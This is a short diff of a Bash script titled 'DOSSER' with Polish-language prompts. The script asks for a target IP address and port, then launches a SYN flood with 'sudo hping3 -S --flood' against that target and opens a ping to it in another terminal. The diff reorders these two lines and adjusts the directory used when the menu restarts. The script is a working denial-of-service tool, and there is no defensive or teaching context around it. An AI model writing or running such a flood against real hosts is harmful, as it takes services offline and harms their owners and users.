@@ -2,8 +2,8 @@
 figlet "DOSSER" | lolcat
 read -r -p "Wprowadź IP celu - " IP
 read -r -p "Wprowadź port celu - " PORT
-sudo hping3 -S --flood -V -p $PORT $IP
 gnome-terminal -- sudo ping $IP
+sudo hping3 -S --flood -V -p $PORT $IP
 while true
 do
  read -r -p "Uruchomić skrypt ponownie ? (y/n) - " start
@@ -11,6 +11,7 @@ do
  case $start in
      [yY][eE][sS]|[yY])
   cd ..
+  cd Scripts
   clear
   ./main.sh
  break
